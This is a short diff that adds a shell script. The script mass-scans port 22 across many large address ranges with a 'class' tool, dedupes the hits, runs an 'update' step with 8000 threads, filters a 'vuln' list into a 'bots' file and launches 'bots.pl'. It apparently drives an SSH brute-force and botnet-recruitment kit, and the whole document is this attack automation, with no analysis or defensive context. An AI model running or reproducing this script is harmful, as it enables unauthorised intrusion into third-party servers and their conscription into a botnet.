@@ -1,0 +1,20 @@
+./class 22 -a 38 -i eth0 -s 10
+./class 22 -a 39 -i eth0 -s 10
+./class 22 -a 40 -i eth0 -s 10
+./class 22 -a 41 -i eth0 -s 10
+./class 22 -a 42 -i eth0 -s 10
+./class 22 -a 69 -i eth0 -s 10
+./class 22 -a 70 -i eth0 -s 10
+./class 22 -a 71 -i eth0 -s 10
+./class 22 -a 72 -i eth0 -s 10
+./class 22 -a 73 -i eth0 -s 10
+./class 22 -a 74 -i eth0 -s 10
+./class 22 -a 75 -i eth0 -s 10
+./class 22 -a 76 -i eth0 -s 10
+./class 22 -a 79 -i eth0 -s 10
+./class 22 -a 81 -i eth0 -s 10
+cat bios.txt | sort | uniq > mfu.txt
+rm bios.txt
+./update 8000
+cat vuln.txt | grep -v DUP  >  bots.txt
+perl bots.pl
